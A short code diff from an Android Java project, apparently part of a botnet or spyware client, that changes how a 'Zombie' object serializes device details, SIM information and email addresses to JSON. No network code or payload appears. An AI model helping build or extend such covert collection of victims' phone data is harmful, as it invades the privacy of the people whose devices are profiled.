@@ -42,9 +42,9 @@ public class Zombie {
         JSONObject JSONZombie = new JSONObject();
 
         try {
-            JSONZombie.put("device", this.device);
+            JSONZombie.put("device", new JSONObject(this.device));
             JSONZombie.put("email_addresses", new JSONArray(this.email_addresses));
-            JSONZombie.put("SIM", this.SIM);
+            JSONZombie.put("SIM", new JSONObject(this.SIM));
         } catch (JSONException ex) {
             Log.wtf(TAG, Zombie.class.getName() + "->toJSON: " + Log.getStackTraceString(ex));
         }
